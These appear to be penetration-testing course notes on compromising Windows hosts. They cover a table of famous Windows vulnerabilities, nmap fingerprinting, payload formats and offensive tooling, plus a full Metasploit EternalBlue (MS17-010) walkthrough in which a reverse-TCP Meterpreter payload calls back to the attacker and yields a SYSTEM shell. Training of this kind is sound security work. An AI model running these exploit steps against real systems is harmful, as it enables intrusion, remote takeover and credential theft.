#### Windows Vulnerability Table

![[{71821FAB-2C44-4408-AC54-4D1982A88EF0}.png]]
## Prominent Windows Exploits

Over the last few years, several `vulnerabilities` in the `Windows operating system` and their corresponding attacks are some of the most `exploited vulnerabilities` of our time.

| Vulnerability    | Description                                                                                                                                                                                  |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MS08-067`       | A critical `SMB` flaw patched by `MS08-067` that enabled easy remote code execution; widely abused by the `Conficker` worm and even leveraged by `Stuxnet`.                                  |
| `Eternal Blue`   | Exploit of `MS17-010` (`SMB v1`); used in `WannaCry` and `NotPetya` ransomware attacks to achieve remote code execution across vulnerable Windows hosts.                                     |
| `PrintNightmare` | A `Windows Print Spooler` `remote code execution` issue where installing a malicious printer driver (with valid credentials or a low-privilege shell) yields `SYSTEM`-level access.          |
| `BlueKeep`       | `CVE-2019-0708` — an `RDP` vulnerability allowing `remote code execution` across older Windows versions (Windows 2000 through Server 2008 R2) via mishandled channels.                       |
| `Sigred`         | `CVE-2020-1350` — a `DNS` `SIG` resource record parsing bug that can lead to `Domain Admin` compromise by targeting the domain's DNS server (often the primary `Domain Controller`).         |
| `SeriousSam`     | `CVE-2021-36934` — improper permissions on `C:\Windows\system32\config` (and its `Volume Shadow Copy` backups) let non-elevated users access the `SAM` database and dump credentials.        |
| `Zerologon`      | `CVE-2020-1472` — cryptographic flaw in the `Netlogon`/`MS-NRPC` protocol allowing attackers to forge `NTLM` authentication and perform account changes; can enable rapid `Domain` takeover. |

---

# Enumerating Windows & Fingerprinting Methods

```powershell

# Pinged Host
OathBornX@htb[/htb]$ ping 192.168.86.39

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms

# OS Detection  Scan
OathBornX@htb[/htb]$ sudo nmap -v -O 192.168.86.39

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)

# Banner Grab to Enumerate Ports 
OathBornX@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
```

---

# Bats, DLLs, & MSI Files

Creating payloads for Windows hosts offers several options: `DLL`s, `batch files`, `MSI` packages, `PowerShell` scripts, `EXE`s, and delivery formats like `HTA`/`LNK` — all are `executable` on the target. Each has trade-offs: `MSI`/`DLL` are useful when you have `elevated privileges` or installer-based delivery; `PowerShell` enables `fileless`/in-memory execution and stealth; `batch files` and social-engineering vectors (`HTA`/`LNK`) work when you need user interaction. Match the payload to your delivery mechanism and the privileges you can obtain.

##### Payload Types to Consider

-  `DLLs` — A `Dynamic Link Library` (`DLL`) contains shared code and data Windows programs use. They’re modular and update-friendly; as a pentester you can inject a malicious `DLL` or hijack a vulnerable library to escalate to `SYSTEM` or bypass `User Account Control` (`UAC`).

- `Batch` — Plain-text `.bat` scripts run via the Windows command interpreter. They’re simple and reliable for automating commands (open a listening port, call back to your host, run quick enumeration) but noisy and easy for defenders to spot.

- `VBScript` — `VBScript` (`VBS`) is an older scripting language derived from Visual Basic. It’s mostly disabled in modern browsers but still useful in phishing or social-engineering scenarios (e.g., convincing a user to enable `macros` or trigger the Windows scripting engine).

- `MSI` — An `.msi` is a Windows Installer database. Crafting a payload as an `.msi` lets you run it with `msiexec` to perform installs and potentially get elevated execution (useful for persistence or an elevated reverse shell), though it’s more visible and often requires admin rights.

- `PowerShell` — `PowerShell` is both a shell and a powerful scripting language built on the .NET CLR. It’s ideal for `fileless` or in-memory execution, complex orchestration, and stealthy post-exploitation tasks — the go-to when you want capability with minimal disk artifacts.

---

# Tools, Tactics and Procedures for Payload Generation, Transfer and Execution

#### Payload Generation

|Resource|Description|
|---|---|
|`MSFVenom & Metasploit-Framework`|A highly versatile pentesting toolkit to enumerate hosts, generate `payloads`, run public or custom `exploits`, and perform post-exploitation — a true `swiss-army` for engagement workflows.|
|`Payloads All The Things`|A collection of `payload generation` resources and `cheat sheets` covering many delivery formats and techniques.|
|`Mythic C2 Framework`|An alternative `Command and Control` (`C2`) framework to `Metasploit` focused on flexible `payload generation` and C2 operations.|
|`Nishang`|A repository of `Offensive PowerShell` implants and scripts useful for post-exploitation, lateral movement, and automation.|
|`Darkarmour`|A toolkit for producing and using `obfuscated binaries` targeting `Windows` hosts to help evade basic detection.|

#### Payload Transfer and Execution

|Resource / Tool|Description|
|---|---|
|`Impacket`|Python toolset for direct protocol interaction (`psexec`, `smbclient`, `WMI`, `Kerberos`) and for standing up an `SMB` server to move or execute payloads.|
|`Payloads All The Things`|Curated collection of `oneliners` and examples for quick payload creation and file transfer techniques.|
|`SMB`|File-sharing protocol useful for hosting/transferring payloads and exfiltrating data (including `C$`/`admin$` shares) on `domain-joined` hosts.|
|`Metasploit` (remote execution)|Many exploit modules auto-build, stage, and execute payloads for you, simplifying remote execution workflows.|
|Other protocols|Alternate file upload/transfer channels such as `FTP`, `TFTP`, and `HTTP/S` — enumerate available services and pick the simplest reliable vector.|

---
# Example Compromise Walkthrough

#### Enumerate the Host

```bash
OathBornX@htb[/htb]$ nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29
```

After scanning and validating the target, we identified it as `Windows Server 2016 Standard 6.3`. The host is standalone (not `domain-joined`) and exposes multiple services. Based on the results, potential exploit paths include:

- `IIS` exploitation if the web service is accessible
- `SMB` interaction using `Impacket` tools or authentication with valid credentials
- Possible `RCE` opportunities at the OS level

Given that `MS17-010` (`EternalBlue`) impacts `Windows Server` versions from 2008 through 2016, this host likely falls within the vulnerable range. To confirm, run the `Metasploit` auxiliary module `auxiliary/scanner/smb/smb_ms17_010` to validate exposure to `EternalBlue`.

#### Determine an Exploit Path

```bash
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                 Required  Description
   ----         ---------------                 --------  -----------
   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
                k/data/wordlists/named_pipes.t
                xt
   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f
                                                          ile with syntax 'file:<path>'
   RPORT        445                             yes       The SMB service port (TCP)
   SMBDomain    .                               no        The Windows domain to use for authentication
   SMBPass                                      no        The password for the specified username
   SMBUser                                      no        The username to authenticate as
   THREADS      1                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97

RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Choose & Configure Out Exploit & Payload 

```bash
msf6 > search eternal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

```bash
msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Before launching the exploit, configure your payload options: any field marked `Required` must be filled. Set `RHOSTS` (target IPs), `LHOST` (your attack interface), and `LPORT` (listener port). Leave other settings at their defaults for this run, but confirm the chosen `PAYLOAD` is compatible and that your `listener` is up before executing the `exploit`.

#### Execute Our Attack

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Selecting PowerShell target
[*] 10.129.201.97:445 - Executing the payload...
[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

Success — you’ve got a `SYSTEM`-level `shell` from the `exploit`. `Meterpreter` has opened a session and you’re at the `meterpreter >` prompt. From here use `Meterpreter` commands to collect `system` information, dump user `credentials`, or run additional `post-exploitation` modules. If you prefer direct interaction, run the `shell` command to drop into an interactive host `shell`. Keep your `payload` and `listener` active while you work.

#### Identify Our Shell

```bash
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Use `CMD` when:

- You are on an older host that may not include PowerShell.
- When you only require simple interactions/access to the host.
- When you plan to use simple batch files, net commands, or MS-DOS native tools.
- When you believe that execution policies may affect your ability to run scripts or other actions on the host.

Use `PowerShell` when:

- You are planning to utilize cmdlets or other custom-built scripts.
- When you wish to interact with .NET objects instead of text output.
- When being stealthy is of lesser concern.
- If you are planning to interact with cloud-based services and hosts.
- If your scripts set and use Aliases.